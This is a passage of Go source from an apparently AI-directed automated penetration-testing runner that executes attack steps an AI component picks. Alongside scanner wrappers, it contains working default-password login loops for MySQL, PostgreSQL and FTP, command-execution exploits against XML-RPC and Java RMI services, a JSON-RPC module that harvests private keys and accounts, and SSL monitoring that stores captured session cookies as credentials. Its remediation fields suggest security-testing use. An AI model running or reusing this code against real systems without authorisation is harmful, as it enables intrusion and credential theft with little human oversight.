				Type:        "file_upload_rce",
				Severity:    "critical",
				Target:      decision.Target,
				Description: "File upload RCE achieved",
			})
		}
	}

	action.Result = result.Output
	action.Success = result.Success

	return action, nil
}

// actionNucleiScan runs Nuclei vulnerability scanner
func (r *AutoRunner) actionNucleiScan(ctx context.Context, action *Action, decision *AIDecision) (*Action, error) {
	if err := r.framework.Use("auxiliary/scanner/nuclei"); err != nil {
		action.Result = fmt.Sprintf("Module error: %v", err)
		action.Success = false
		return action, err
	}

	module := r.framework.Current()

	// Parse target URL
	target := decision.Target
	port := "80"
	ssl := false

	if strings.HasPrefix(target, "http://") {
		target = strings.TrimPrefix(target, "http://")
	} else if strings.HasPrefix(target, "https://") {
		target = strings.TrimPrefix(target, "https://")
		ssl = true
		port = "443"
	}

	if strings.Contains(target, ":") {
		parts := strings.Split(target, ":")
		target = parts[0]
		portPath := parts[1]
		if idx := strings.Index(portPath, "/"); idx != -1 {
			port = portPath[:idx]
		} else {
			port = portPath
		}
	}

	module.SetOption("RHOSTS", target)
	module.SetOption("RPORT", port)
	if ssl {
		module.SetOption("SSL", "true")
	}

	// Optional settings
	if templates := getOpt(decision.Options, "templates"); templates != "" {
		module.SetOption("TEMPLATES", templates)
	}
	if severity := getOpt(decision.Options, "severity"); severity != "" {
		module.SetOption("SEVERITY", severity)
	}

	result, err := module.Run(ctx)
	if err != nil {
		action.Result = fmt.Sprintf("Nuclei scan failed: %v", err)
		action.Success = false
		return action, err
	}

	// Record findings from nuclei
	if result.Success {
		if findings, ok := result.Data["findings"].([]exploit.NucleiFinding); ok {
			for _, f := range findings {
				severity := f.Info.Severity
				if severity == "" {
					severity = "info"
				}

				r.state.Vulnerabilities = append(r.state.Vulnerabilities, Finding{
					Type:        "nuclei_" + f.TemplateID,
					Severity:    severity,
					Target:      f.MatchedAt,
					Description: f.Info.Name + ": " + f.Info.Description,
					Evidence:    f.TemplateID,
					Timestamp:   time.Now(),
				})

				if r.callbacks.OnFinding != nil {
					r.callbacks.OnFinding(Finding{
						Type:        "nuclei_" + f.TemplateID,
						Severity:    severity,
						Target:      f.MatchedAt,
						Description: f.Info.Name,
					})
				}
			}
		}
	}

	action.Result = result.Output
	action.Success = result.Success

	return action, nil
}

// actionXSSScan tests for XSS vulnerabilities
func (r *AutoRunner) actionXSSScan(ctx context.Context, action *Action, decision *AIDecision) (*Action, error) {
	if err := r.framework.Use("auxiliary/scanner/http/xss"); err != nil {
		action.Result = fmt.Sprintf("Module error: %v", err)
		action.Success = false
		return action, err
	}

	module := r.framework.Current()

	// Parse target URL
	target := decision.Target
	port := "80"

	if strings.HasPrefix(target, "http://") {
		target = strings.TrimPrefix(target, "http://")
	} else if strings.HasPrefix(target, "https://") {
		target = strings.TrimPrefix(target, "https://")
		module.SetOption("SSL", "true")
		port = "443"
	}

	if strings.Contains(target, ":") {
		parts := strings.Split(target, ":")
		target = parts[0]
		portPath := parts[1]
		if idx := strings.Index(portPath, "/"); idx != -1 {
			port = portPath[:idx]
		} else {
			port = portPath
		}
	}

	module.SetOption("RHOSTS", target)
	module.SetOption("RPORT", port)

	if uri := getOpt(decision.Options, "uri"); uri != "" {
		module.SetOption("TARGETURI", uri)
	}
	if cookie := getOpt(decision.Options, "cookie"); cookie != "" {
		module.SetOption("COOKIE", cookie)
	}
	if method := getOpt(decision.Options, "method"); method != "" {
		module.SetOption("METHOD", method)
	}

	result, err := module.Run(ctx)
	if err != nil {
		action.Result = fmt.Sprintf("XSS scan failed: %v", err)
		action.Success = false
		return action, err
	}

	if result.Success {
		r.state.Vulnerabilities = append(r.state.Vulnerabilities, Finding{
			Type:        "xss_reflected",
			Severity:    "medium",
			Target:      decision.Target,
			Description: "Cross-Site Scripting (XSS) vulnerability detected",
			Evidence:    result.Output,
			Remediation: "Encode output, use Content-Security-Policy, validate input",
			Timestamp:   time.Now(),
		})

		if r.callbacks.OnFinding != nil {
			r.callbacks.OnFinding(Finding{
				Type:        "xss_reflected",
				Severity:    "medium",
				Target:      decision.Target,
				Description: "XSS vulnerability found",
			})
		}
	}

	action.Result = result.Output
	action.Success = result.Success

	return action, nil
}

// actionNiktoScan runs Nikto web scanner
func (r *AutoRunner) actionNiktoScan(ctx context.Context, action *Action, decision *AIDecision) (*Action, error) {
	if err := r.framework.Use("auxiliary/scanner/http/nikto"); err != nil {
		action.Result = fmt.Sprintf("Module error: %v", err)
		action.Success = false
		return action, err
	}

	module := r.framework.Current()

	// Parse target URL
	target := decision.Target
	port := "80"

	if strings.HasPrefix(target, "http://") {
		target = strings.TrimPrefix(target, "http://")
	} else if strings.HasPrefix(target, "https://") {
		target = strings.TrimPrefix(target, "https://")
		module.SetOption("SSL", "true")
		port = "443"
	}

	if strings.Contains(target, ":") {
		parts := strings.Split(target, ":")
		target = parts[0]
		portPath := parts[1]
		if idx := strings.Index(portPath, "/"); idx != -1 {
			port = portPath[:idx]
		} else {
			port = portPath
		}
	}

	module.SetOption("RHOSTS", target)
	module.SetOption("RPORT", port)

	// Set shorter timeout for autopwn
	module.SetOption("MAXTIME", "60")

	result, err := module.Run(ctx)
	if err != nil {
		action.Result = fmt.Sprintf("Nikto scan failed: %v", err)
		action.Success = false
		return action, err
	}

	// Record findings
	if result.Success {
		if findings, ok := result.Data["findings"].([]exploit.NiktoFinding); ok {
			for _, f := range findings {
				severity := "info"
				desc := strings.ToLower(f.Description)
				if strings.Contains(desc, "vulnerab") || strings.Contains(desc, "exploit") {
					severity = "high"
				} else if strings.Contains(desc, "config") || strings.Contains(desc, "header") {
					severity = "medium"
				}

				r.state.Vulnerabilities = append(r.state.Vulnerabilities, Finding{
					Type:        "nikto_" + f.Reference,
					Severity:    severity,
					Target:      decision.Target,
					Description: f.Description,
					Evidence:    fmt.Sprintf("%s %s", f.Method, f.URI),
					Timestamp:   time.Now(),
				})

				if r.callbacks.OnFinding != nil {
					r.callbacks.OnFinding(Finding{
						Type:        "nikto_finding",
						Severity:    severity,
						Target:      decision.Target,
						Description: f.Description,
					})
				}
			}
		}
	}

	action.Result = result.Output
	action.Success = result.Success

	return action, nil
}

// actionSubdomainEnum enumerates subdomains using subfinder
func (r *AutoRunner) actionSubdomainEnum(ctx context.Context, action *Action, decision *AIDecision) (*Action, error) {
	if err := r.framework.Use("auxiliary/gather/subdomain_enum"); err != nil {
		action.Result = fmt.Sprintf("Module error: %v", err)
		action.Success = false
		return action, err
	}

	module := r.framework.Current()

	// Get domain from target
	domain := decision.Target

	// Strip protocol if present
	domain = strings.TrimPrefix(domain, "http://")
	domain = strings.TrimPrefix(domain, "https://")

	// Strip port if present
	if idx := strings.Index(domain, ":"); idx != -1 {
		domain = domain[:idx]
	}

	// Strip path if present
	if idx := strings.Index(domain, "/"); idx != -1 {
		domain = domain[:idx]
	}

	module.SetOption("DOMAIN", domain)

	if timeout := getOpt(decision.Options, "timeout"); timeout != "" {
		module.SetOption("TIMEOUT", timeout)
	}
	if threads := getOpt(decision.Options, "threads"); threads != "" {
		module.SetOption("THREADS", threads)
	}
	if recursive := getOpt(decision.Options, "recursive"); recursive != "" {
		module.SetOption("RECURSIVE", recursive)
	}

	result, err := module.Run(ctx)
	if err != nil {
		action.Result = fmt.Sprintf("Subdomain enumeration failed: %v", err)
		action.Success = false
		return action, err
	}

	// Record subdomains as potential hosts
	if result.Success {
		if subdomains, ok := result.Data["subdomains"].([]string); ok {
			for _, subdomain := range subdomains {
				r.state.DiscoveredHosts = append(r.state.DiscoveredHosts, HostInfo{
					Hostname: subdomain,
					Status:   "discovered",
				})
			}

			// Add finding for discovered subdomains
			r.state.Vulnerabilities = append(r.state.Vulnerabilities, Finding{
				Type:        "subdomain_discovery",
				Severity:    "info",
				Target:      domain,
				Description: fmt.Sprintf("Discovered %d subdomains", len(subdomains)),
				Evidence:    strings.Join(subdomains, "\n"),
				Timestamp:   time.Now(),
			})

			if r.callbacks.OnFinding != nil {
				r.callbacks.OnFinding(Finding{
					Type:        "subdomain_discovery",
					Severity:    "info",
					Target:      domain,
					Description: fmt.Sprintf("Found %d subdomains for %s", len(subdomains), domain),
				})
			}
		}
	}

	action.Result = result.Output
	action.Success = result.Success

	return action, nil
}

// actionSSLScan analyzes SSL/TLS configuration
func (r *AutoRunner) actionSSLScan(ctx context.Context, action *Action, decision *AIDecision) (*Action, error) {
	if err := r.framework.Use("auxiliary/scanner/ssl"); err != nil {
		action.Result = fmt.Sprintf("Module error: %v", err)
		action.Success = false
		return action, err
	}

	module := r.framework.Current()

	// Parse target
	target := decision.Target
	port := "443"

	// Strip protocol if present
	target = strings.TrimPrefix(target, "https://")
	target = strings.TrimPrefix(target, "http://")

	// Strip path if present
	if idx := strings.Index(target, "/"); idx != -1 {
		target = target[:idx]
	}

	// Extract port if present
	if strings.Contains(target, ":") {
		parts := strings.Split(target, ":")
		target = parts[0]
		port = parts[1]
	}

	module.SetOption("RHOSTS", target)
	module.SetOption("RPORT", port)

	if timeout := getOpt(decision.Options, "timeout"); timeout != "" {
		module.SetOption("TIMEOUT", timeout)
	}

	result, err := module.Run(ctx)
	if err != nil {
		action.Result = fmt.Sprintf("SSL scan failed: %v", err)
		action.Success = false
		return action, err
	}

	// Record SSL findings
	if result.Success {
		if findings, ok := result.Data["findings"].([]exploit.SSLFinding); ok {
			for _, f := range findings {
				r.state.Vulnerabilities = append(r.state.Vulnerabilities, Finding{
					Type:        "ssl_" + f.Type,
					Severity:    f.Severity,
					Target:      fmt.Sprintf("%s:%s", target, port),
					Description: f.Description,
					Evidence:    f.Details,
					Timestamp:   time.Now(),
				})

				if r.callbacks.OnFinding != nil {
					r.callbacks.OnFinding(Finding{
						Type:        "ssl_" + f.Type,
						Severity:    f.Severity,
						Target:      fmt.Sprintf("%s:%s", target, port),
						Description: f.Description,
					})
				}
			}
		}
	}

	action.Result = result.Output
	action.Success = result.Success

	return action, nil
}

// actionSSLConnect establishes persistent SSL connection using openssl s_client
func (r *AutoRunner) actionSSLConnect(ctx context.Context, action *Action, decision *AIDecision) (*Action, error) {
	connector := exploit.NewOpenSSLConnection()

	// Parse target
	target := decision.Target
	port := "443"

	// Strip protocol if present
	target = strings.TrimPrefix(target, "https://")
	target = strings.TrimPrefix(target, "http://")

	// Strip path if present
	if idx := strings.Index(target, "/"); idx != -1 {
		target = target[:idx]
	}

	// Extract port if present
	if strings.Contains(target, ":") {
		parts := strings.Split(target, ":")
		target = parts[0]
		port = parts[1]
	}

	connector.SetOption("RHOSTS", target)
	connector.SetOption("RPORT", port)

	if monitorTime := getOpt(decision.Options, "monitor_time"); monitorTime != "" {
		connector.SetOption("MONITOR_TIME", monitorTime)
	} else {
		// Default to 30 seconds for auto mode
		connector.SetOption("MONITOR_TIME", "30")
	}

	if sni := getOpt(decision.Options, "sni"); sni != "" {
		connector.SetOption("SNI", sni)
	}

	if starttls := getOpt(decision.Options, "starttls"); starttls != "" {
		connector.SetOption("STARTTLS", starttls)
	}

	result, err := connector.Run(ctx)
	if err != nil {
		action.Result = fmt.Sprintf("SSL connection failed: %v", err)
		action.Success = false
		return action, err
	}

	// Build evidence from SSL analysis
	var evidence strings.Builder
	evidence.WriteString("SSL/TLS Connection Analysis\n")
	evidence.WriteString(fmt.Sprintf("Target: %s:%s\n", target, port))

	if protocol, ok := result.Data["protocol"].(string); ok {
		evidence.WriteString(fmt.Sprintf("Protocol: %s\n", protocol))
	}
	if cipher, ok := result.Data["cipher"].(string); ok {
		evidence.WriteString(fmt.Sprintf("Cipher Suite: %s\n", cipher))
	}
	if certInfo, ok := result.Data["certificate"].(string); ok {
		evidence.WriteString(fmt.Sprintf("Certificate:\n%s\n", certInfo))
	}

	// Store any captured cookies
	var cookiesFound []string
	if result.Success {
		if cookies, ok := result.Data["cookies"].([]string); ok && len(cookies) > 0 {
			evidence.WriteString("Captured Session Cookies:\n")
			for _, cookie := range cookies {
				cookiesFound = append(cookiesFound, cookie)
				evidence.WriteString(fmt.Sprintf("  - %s\n", cookie))
				r.state.Credentials = append(r.state.Credentials, CredentialFind{
					Username: "session_cookie",
					Password: cookie,
					Service:  "ssl_captured",
					Target:   fmt.Sprintf("%s:%s", target, port),
				})

				if r.callbacks.OnCredential != nil {
					r.callbacks.OnCredential(CredentialFind{
						Username: "session_cookie",
						Password: cookie,
						Service:  "ssl_captured",
						Target:   fmt.Sprintf("%s:%s", target, port),
					})
				}
			}
		}

		if sensitive, ok := result.Data["sensitive_data"].([]string); ok && len(sensitive) > 0 {
			evidence.WriteString("Sensitive Data Captured:\n")
			for _, data := range sensitive {
				evidence.WriteString(fmt.Sprintf("  - %s\n", data))
			}
		}

		// Determine severity based on findings
		severity := "info"
		description := "SSL connection established and monitored for traffic"
		if len(cookiesFound) > 0 {
			severity = "medium"
			description = "SSL traffic analysis captured session cookies"
		}

		// Record connection success
		r.state.Vulnerabilities = append(r.state.Vulnerabilities, Finding{
			Type:        "ssl_traffic_analysis",
			Severity:    severity,
			Target:      fmt.Sprintf("%s:%s", target, port),
			Service:     "https",
			Description: description,
			Evidence:    evidence.String(),
			Remediation: "Ensure TLS 1.2+ is enforced. Use secure cipher suites. Implement certificate pinning for sensitive applications. Set Secure and HttpOnly flags on cookies.",
			Timestamp:   time.Now(),
		})

		if r.callbacks.OnFinding != nil {
			r.callbacks.OnFinding(r.state.Vulnerabilities[len(r.state.Vulnerabilities)-1])
		}
	}

	action.Result = result.Output
	action.Success = result.Success

	return action, nil
}

// actionAPIFuzz tests REST/GraphQL APIs for vulnerabilities
func (r *AutoRunner) actionAPIFuzz(ctx context.Context, action *Action, decision *AIDecision) (*Action, error) {
	if err := r.framework.Use("auxiliary/scanner/api_fuzz"); err != nil {
		action.Result = fmt.Sprintf("Module error: %v", err)
		action.Success = false
		return action, err
	}

	module := r.framework.Current()

	// Parse target
	target := decision.Target
	port := "80"
	ssl := "false"
	basePath := "/api"

	// Handle full URLs
	if strings.HasPrefix(target, "https://") {
		ssl = "true"
		port = "443"
		target = strings.TrimPrefix(target, "https://")
	} else {
		target = strings.TrimPrefix(target, "http://")
	}

	// Extract path if present
	if idx := strings.Index(target, "/"); idx != -1 {
		basePath = target[idx:]
		target = target[:idx]
	}

	// Extract port if present
	if strings.Contains(target, ":") {
		parts := strings.Split(target, ":")
		target = parts[0]
		port = parts[1]
	}

	module.SetOption("RHOSTS", target)
	module.SetOption("RPORT", port)
	module.SetOption("SSL", ssl)
	module.SetOption("TARGETURI", basePath)

	if authToken := getOpt(decision.Options, "auth_token"); authToken != "" {
		module.SetOption("AUTH_TOKEN", authToken)
	}
	if cookie := getOpt(decision.Options, "cookie"); cookie != "" {
		module.SetOption("COOKIE", cookie)
	}

	result, err := module.Run(ctx)
	if err != nil {
		action.Result = fmt.Sprintf("API fuzzing failed: %v", err)
		action.Success = false
		return action, err
	}

	// Record API findings
	if result.Success {
		if findings, ok := result.Data["findings"].([]exploit.APIFinding); ok {
			for _, f := range findings {
				r.state.Vulnerabilities = append(r.state.Vulnerabilities, Finding{
					Type:        "api_" + f.Type,
					Severity:    f.Severity,
					Target:      fmt.Sprintf("%s:%s%s", target, port, f.Endpoint),
					Description: f.Description,
					Evidence:    f.Evidence,
					Timestamp:   time.Now(),
				})

				if r.callbacks.OnFinding != nil {
					r.callbacks.OnFinding(Finding{
						Type:        "api_" + f.Type,
						Severity:    f.Severity,
						Target:      fmt.Sprintf("%s:%s%s", target, port, f.Endpoint),
						Description: f.Description,
					})
				}
			}
		}
	}

	action.Result = result.Output
	action.Success = result.Success

	return action, nil
}

// actionCrackHash attempts to crack password hashes using john/hashcat
func (r *AutoRunner) actionCrackHash(ctx context.Context, action *Action, decision *AIDecision) (*Action, error) {
	if err := r.framework.Use("auxiliary/analyze/crack_hash"); err != nil {
		action.Result = fmt.Sprintf("Module error: %v", err)
		action.Success = false
		return action, err
	}

	module := r.framework.Current()

	// Get hash from options or target
	hash := getOpt(decision.Options, "hash")
	if hash == "" {
		hash = decision.Target
	}

	hashType := getOpt(decision.Options, "hash_type")
	if hashType == "" {
		// Auto-detect hash type by length
		hashType = detectHashType(hash)
	}

	module.SetOption("HASH", hash)
	module.SetOption("HASH_TYPE", hashType)

	if wordlist := getOpt(decision.Options, "wordlist"); wordlist != "" {
		module.SetOption("WORDLIST", wordlist)
	}
	if tool := getOpt(decision.Options, "tool"); tool != "" {
		module.SetOption("TOOL", tool)
	}

	result, err := module.Run(ctx)
	if err != nil {
		action.Result = fmt.Sprintf("Hash cracking failed: %v", err)
		action.Success = false
		return action, err
	}

	// Record cracked credentials
	if result.Success {
		for _, cred := range result.Credentials {
			cf := CredentialFind{
				Password: cred.Password,
				Hash:     cred.Hash,
				Service:  "cracked_hash",
				Target:   cred.Type,
			}
			r.state.Credentials = append(r.state.Credentials, cf)

			if r.callbacks.OnCredential != nil {
				r.callbacks.OnCredential(cf)
			}
		}

		// Add as finding
		r.state.Vulnerabilities = append(r.state.Vulnerabilities, Finding{
			Type:        "cracked_password",
			Severity:    "high",
			Target:      hash,
			Description: fmt.Sprintf("Password hash cracked: %s", result.Credentials[0].Password),
			Evidence:    result.Output,
			Timestamp:   time.Now(),
		})

		if r.callbacks.OnFinding != nil {
			r.callbacks.OnFinding(Finding{
				Type:        "cracked_password",
				Severity:    "high",
				Target:      hash,
				Description: "Password hash successfully cracked",
			})
		}
	}

	action.Result = result.Output
	action.Success = result.Success

	return action, nil
}

// detectHashType attempts to identify hash type by length and format
func detectHashType(hash string) string {
	hash = strings.TrimSpace(hash)

	// Remove common prefixes
	if strings.HasPrefix(hash, "$1$") {
		return "md5crypt"
	}
	if strings.HasPrefix(hash, "$5$") {
		return "sha256crypt"
	}
	if strings.HasPrefix(hash, "$6$") {
		return "sha512crypt"
	}
	if strings.HasPrefix(hash, "$2a$") || strings.HasPrefix(hash, "$2b$") {
		return "bcrypt"
	}

	// Detect by length (for raw hashes)
	switch len(hash) {
	case 32:
		return "md5"
	case 40:
		return "sha1"
	case 64:
		return "sha256"
	case 128:
		return "sha512"
	default:
		// Check if it looks like NTLM (32 hex chars, uppercase usually)
		if len(hash) == 32 {
			return "ntlm"
		}
		return "md5" // Default fallback
	}
}

func (r *AutoRunner) actionMySQLCheck(ctx context.Context, action *Action, decision *AIDecision) (*Action, error) {
	target := decision.Target
	host := target
	port := "3306"

	if strings.Contains(target, ":") {
		parts := strings.Split(target, ":")
		host = parts[0]
		port = parts[1]
	}

	// Try common default credentials
	creds := []struct{ user, pass string }{
		{"root", ""},
		{"root", "root"},
		{"root", "mysql"},
		{"root", "password"},
		{"mysql", "mysql"},
		{"admin", "admin"},
	}

	for _, c := range creds {
		cmd := exec.CommandContext(ctx, "mysql", "-h", host, "-P", port, "-u", c.user, fmt.Sprintf("-p%s", c.pass), "-e", "SELECT 1", "--connect-timeout=3")
		output, err := cmd.CombinedOutput()

		if err == nil || strings.Contains(string(output), "1") {
			// Success!
			cf := CredentialFind{
				Username: c.user,
				Password: c.pass,
				Service:  "mysql",
				Target:   target,
			}
			r.state.Credentials = append(r.state.Credentials, cf)

			if r.callbacks.OnCredential != nil {
				r.callbacks.OnCredential(cf)
			}

			r.state.Vulnerabilities = append(r.state.Vulnerabilities, Finding{
				Type:        "weak_credentials",
				Severity:    "critical",
				Target:      target,
				Description: fmt.Sprintf("MySQL accessible with %s:%s", c.user, c.pass),
				Timestamp:   time.Now(),
			})

			action.Result = fmt.Sprintf("MySQL login successful: %s:%s", c.user, c.pass)
			action.Success = true
			return action, nil
		}
	}

	action.Result = "MySQL default credentials not found"
	action.Success = false
	return action, nil
}

func (r *AutoRunner) actionMongoDBCheck(ctx context.Context, action *Action, decision *AIDecision) (*Action, error) {
	target := decision.Target
	host := target
	port := "27017"

	if strings.Contains(target, ":") {
		parts := strings.Split(target, ":")
		host = parts[0]
		port = parts[1]
	}

	// Try connecting without auth
	cmd := exec.CommandContext(ctx, "mongosh", "--host", host, "--port", port, "--eval", "db.adminCommand('listDatabases')", "--quiet")
	output, err := cmd.CombinedOutput()

	if err == nil && (strings.Contains(string(output), "databases") || strings.Contains(string(output), "name")) {
		r.state.Vulnerabilities = append(r.state.Vulnerabilities, Finding{
			Type:        "unauthenticated_access",
			Severity:    "critical",
			Target:      target,
			Description: "MongoDB accessible without authentication",
			Evidence:    string(output),
			Timestamp:   time.Now(),
		})

		if r.callbacks.OnFinding != nil {
			r.callbacks.OnFinding(Finding{
				Type:        "unauthenticated_access",
				Severity:    "critical",
				Target:      target,
				Description: "MongoDB accessible without authentication",
			})
		}

		action.Result = "MongoDB accessible without authentication"
		action.Success = true
		return action, nil
	}

	action.Result = "MongoDB requires authentication"
	action.Success = false
	return action, nil
}

func (r *AutoRunner) actionPostgresCheck(ctx context.Context, action *Action, decision *AIDecision) (*Action, error) {
	target := decision.Target
	host := target
	port := "5432"

	if strings.Contains(target, ":") {
		parts := strings.Split(target, ":")
		host = parts[0]
		port = parts[1]
	}

	// Try common default credentials
	creds := []struct{ user, pass string }{
		{"postgres", "postgres"},
		{"postgres", ""},
		{"postgres", "password"},
		{"admin", "admin"},
	}

	for _, c := range creds {
		connStr := fmt.Sprintf("host=%s port=%s user=%s password=%s dbname=postgres connect_timeout=3 sslmode=disable", host, port, c.user, c.pass)
		cmd := exec.CommandContext(ctx, "psql", connStr, "-c", "SELECT 1")
		output, err := cmd.CombinedOutput()

		if err == nil || strings.Contains(string(output), "1") {
			cf := CredentialFind{
				Username: c.user,
				Password: c.pass,
				Service:  "postgresql",
				Target:   target,
			}
			r.state.Credentials = append(r.state.Credentials, cf)

			if r.callbacks.OnCredential != nil {
				r.callbacks.OnCredential(cf)
			}

			r.state.Vulnerabilities = append(r.state.Vulnerabilities, Finding{
				Type:        "weak_credentials",
				Severity:    "critical",
				Target:      target,
				Description: fmt.Sprintf("PostgreSQL accessible with %s:%s", c.user, c.pass),
				Timestamp:   time.Now(),
			})

			action.Result = fmt.Sprintf("PostgreSQL login successful: %s:%s", c.user, c.pass)
			action.Success = true
			return action, nil
		}
	}

	action.Result = "PostgreSQL default credentials not found"
	action.Success = false
	return action, nil
}

func (r *AutoRunner) actionFTPLogin(ctx context.Context, action *Action, decision *AIDecision) (*Action, error) {
	target := decision.Target
	host := target
	port := "21"

	if strings.Contains(target, ":") {
		parts := strings.Split(target, ":")
		host = parts[0]
		port = parts[1]
	}

	// Common FTP credentials
	creds := []struct{ user, pass string }{
		{"ftp", "ftp"},
		{"ftpuser", "ftppass"},
		{"ftpuser", "ftppass123"},
		{"admin", "admin"},
		{"admin", "admin123"},
		{"user", "user"},
		{"test", "test"},
		{"guest", "guest"},
	}

	for _, c := range creds {
		conn, err := net.DialTimeout("tcp", net.JoinHostPort(host, port), 5*time.Second)
		if err != nil {
			continue
		}

		reader := bufio.NewReader(conn)
		reader.ReadString('\n') // banner

		fmt.Fprintf(conn, "USER %s\r\n", c.user)
		line, _ := reader.ReadString('\n')

		if strings.HasPrefix(line, "331") {
			fmt.Fprintf(conn, "PASS %s\r\n", c.pass)
			line, _ = reader.ReadString('\n')

			if strings.HasPrefix(line, "230") {
				conn.Close()

				cf := CredentialFind{
					Username: c.user,
					Password: c.pass,
					Service:  "ftp",
					Target:   target,
				}
				r.state.Credentials = append(r.state.Credentials, cf)

				if r.callbacks.OnCredential != nil {
					r.callbacks.OnCredential(cf)
				}

				r.state.Vulnerabilities = append(r.state.Vulnerabilities, Finding{
					Type:        "weak_credentials",
					Severity:    "high",
					Target:      target,
					Description: fmt.Sprintf("FTP accessible with %s:%s", c.user, c.pass),
					Timestamp:   time.Now(),
				})

				action.Result = fmt.Sprintf("FTP login successful: %s:%s", c.user, c.pass)
				action.Success = true
				return action, nil
			}
		}
		conn.Close()
	}

	action.Result = "FTP default credentials not found"
	action.Success = false
	return action, nil
}

// RPC Exploit Action Handlers

func (r *AutoRunner) actionXMLRPCExploit(ctx context.Context, action *Action, decision *AIDecision) (*Action, error) {
	target := decision.Target
	if target == "" {
		target = r.state.Target
	}

	host := target
	port := "8086"
	if strings.Contains(target, ":") {
		parts := strings.Split(target, ":")
		host = parts[0]
		port = parts[1]
	}

	module := exploit.NewXMLRPCExploit()
	module.SetOption("RHOSTS", host)
	module.SetOption("RPORT", port)

	if cmd := getOpt(decision.Options, "cmd"); cmd != "" {
		module.SetOption("CMD", cmd)
	}
	if method := getOpt(decision.Options, "method"); method != "" {
		module.SetOption("METHOD", method)
	}

	result, err := module.Run(ctx)
	if err != nil {
		action.Result = fmt.Sprintf("XML-RPC exploit error: %v", err)
		action.Success = false
		return action, nil
	}

	action.Result = result.Output
	action.Success = result.Success

	if result.Success {
		// Build evidence string with captured data
		var evidence strings.Builder
		evidence.WriteString("XML-RPC Remote Code Execution Confirmed\n")
		evidence.WriteString(fmt.Sprintf("Endpoint: http://%s:%s\n", host, port))

		if methods, ok := result.Data["methods"].([]string); ok && len(methods) > 0 {
			evidence.WriteString(fmt.Sprintf("Exposed Methods: %v\n", methods))
			action.Result += fmt.Sprintf("\nMethods found: %v", methods)
		}
		if output, ok := result.Data["output"].(string); ok && output != "" {
			evidence.WriteString(fmt.Sprintf("Command Output:\n%s\n", output))
		}
		if raw, ok := result.Data["raw_response"].(string); ok && raw != "" {
			// Truncate if too long
			if len(raw) > 500 {
				raw = raw[:500] + "..."
			}
			evidence.WriteString(fmt.Sprintf("Response Sample:\n%s\n", raw))
		}

		r.state.Vulnerabilities = append(r.state.Vulnerabilities, Finding{
			Type:        "rpc_command_injection",
			Severity:    "critical",
			Target:      fmt.Sprintf("%s:%s", host, port),
			Service:     "xmlrpc",
			Description: "XML-RPC service vulnerable to remote command execution via system.execute method",
			Evidence:    evidence.String(),
			Remediation: "Disable dangerous XML-RPC methods (system.execute, system.run). Implement authentication and input validation. Consider disabling XML-RPC if not needed.",
			Timestamp:   time.Now(),
		})

		if r.callbacks.OnFinding != nil {
			r.callbacks.OnFinding(r.state.Vulnerabilities[len(r.state.Vulnerabilities)-1])
		}
	}

	return action, nil
}

func (r *AutoRunner) actionJSONRPCExploit(ctx context.Context, action *Action, decision *AIDecision) (*Action, error) {
	target := decision.Target
	if target == "" {
		target = r.state.Target
	}

	host := target
	port := "8087"
	if strings.Contains(target, ":") {
		parts := strings.Split(target, ":")
		host = parts[0]
		port = parts[1]
	}

	module := exploit.NewJSONRPCExploit()
	module.SetOption("RHOSTS", host)
	module.SetOption("RPORT", port)

	if method := getOpt(decision.Options, "method"); method != "" {
		module.SetOption("METHOD", method)
	}

	result, err := module.Run(ctx)
	if err != nil {
		action.Result = fmt.Sprintf("JSON-RPC exploit error: %v", err)
		action.Success = false
		return action, nil
	}

	action.Result = result.Output
	action.Success = result.Success

	// Build evidence with captured data
	var evidence strings.Builder
	evidence.WriteString("JSON-RPC Information Disclosure\n")
	evidence.WriteString(fmt.Sprintf("Endpoint: http://%s:%s\n", host, port))

	// Capture any credentials found
	var credsFound []string
	for _, cred := range result.Credentials {
		cf := CredentialFind{
			Username: cred.Username,
			Password: cred.Password,
			Service:  "jsonrpc",
			Target:   target,
		}
		if cred.Type == "api_key" || cred.Type == "private_key" {
			cf.Password = cred.Hash
			credsFound = append(credsFound, fmt.Sprintf("%s: %s", cred.Type, cred.Hash[:min(20, len(cred.Hash))]+"..."))
		} else {
			credsFound = append(credsFound, fmt.Sprintf("%s:%s", cred.Username, cred.Password))
		}
		r.state.Credentials = append(r.state.Credentials, cf)

		if r.callbacks.OnCredential != nil {
			r.callbacks.OnCredential(cf)
		}
	}

	if len(credsFound) > 0 {
		evidence.WriteString(fmt.Sprintf("Credentials/Keys Found:\n"))
		for _, c := range credsFound {
			evidence.WriteString(fmt.Sprintf("  - %s\n", c))
		}
	}

	// Extract other data from result
	if accounts, ok := result.Data["accounts"].([]string); ok && len(accounts) > 0 {
		evidence.WriteString(fmt.Sprintf("Exposed Accounts: %v\n", accounts))
	}
	if balance, ok := result.Data["balance"].(string); ok {
		evidence.WriteString(fmt.Sprintf("Account Balance: %s\n", balance))
	}
	if version, ok := result.Data["client_version"].(string); ok {
		evidence.WriteString(fmt.Sprintf("Client Version: %s\n", version))
	}

	if result.Success {
		r.state.Vulnerabilities = append(r.state.Vulnerabilities, Finding{
			Type:        "rpc_info_disclosure",
			Severity:    "high",
			Target:      fmt.Sprintf("%s:%s", host, port),
			Service:     "jsonrpc",
			Description: "JSON-RPC service exposes sensitive information including private keys and account data",
			Evidence:    evidence.String(),
			Remediation: "Implement authentication for JSON-RPC endpoints. Disable sensitive methods like personal_unlockAccount. Use proper access controls and network segmentation.",
			Timestamp:   time.Now(),
		})

		if r.callbacks.OnFinding != nil {
			r.callbacks.OnFinding(r.state.Vulnerabilities[len(r.state.Vulnerabilities)-1])
		}
	}

	return action, nil
}

func (r *AutoRunner) actionRMIExploit(ctx context.Context, action *Action, decision *AIDecision) (*Action, error) {
	target := decision.Target
	if target == "" {
		target = r.state.Target
	}

	host := target
	port := "1099"
	if strings.Contains(target, ":") {
		parts := strings.Split(target, ":")
		host = parts[0]
		port = parts[1]
	}

	module := exploit.NewJavaRMIExploit()
	module.SetOption("RHOSTS", host)
	module.SetOption("RPORT", port)

	if cmd := getOpt(decision.Options, "cmd"); cmd != "" {
		module.SetOption("CMD", cmd)
	}

	result, err := module.Run(ctx)
	if err != nil {
		action.Result = fmt.Sprintf("RMI exploit error: %v", err)
		action.Success = false
		return action, nil
	}

	action.Result = result.Output
	action.Success = result.Success

	if result.Success {
		// Build evidence from captured data
		var evidence strings.Builder
		evidence.WriteString("Java RMI Service Exploitation\n")
		evidence.WriteString(fmt.Sprintf("Endpoint: %s:%s\n", host, port))

		if objects, ok := result.Data["remote_objects"].([]string); ok && len(objects) > 0 {
			evidence.WriteString("Exposed Remote Objects:\n")
			for _, obj := range objects {
				evidence.WriteString(fmt.Sprintf("  - %s\n", obj))
			}
		}
